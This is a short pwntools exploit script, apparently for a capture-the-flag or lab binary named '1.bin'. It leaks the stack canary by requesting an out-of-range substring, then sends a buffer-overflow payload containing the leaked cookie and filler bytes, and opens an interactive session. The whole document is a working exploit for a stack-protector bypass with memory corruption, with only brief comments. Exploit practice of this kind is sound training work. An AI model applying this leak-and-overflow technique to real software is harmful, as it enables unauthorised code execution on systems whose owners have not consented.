
from pwn import *

# Start process
p = process("./1.bin")
gdb.attach(p)

# Leak the cookie by reading a "substring" well beyond
# the array on the stack.
p.send(b"abc123\n")		# string
p.send(b"24\n")			# start  (cookie begins here on the stack)
p.send(b"8\n")			# length (cookie is 8 bytes long)
p.readuntil(b"\n")

cookie = p.read(8)

p.send(b"A"*24 + cookie + b"BBBBBBBB" + b"CCCCCCCC" + b"\n")
p.send(b"0\n")
p.send(b"0\n")

p.send(b"exit\n")
p.send(b"0\n")
p.send(b"0\n")

p.interactive()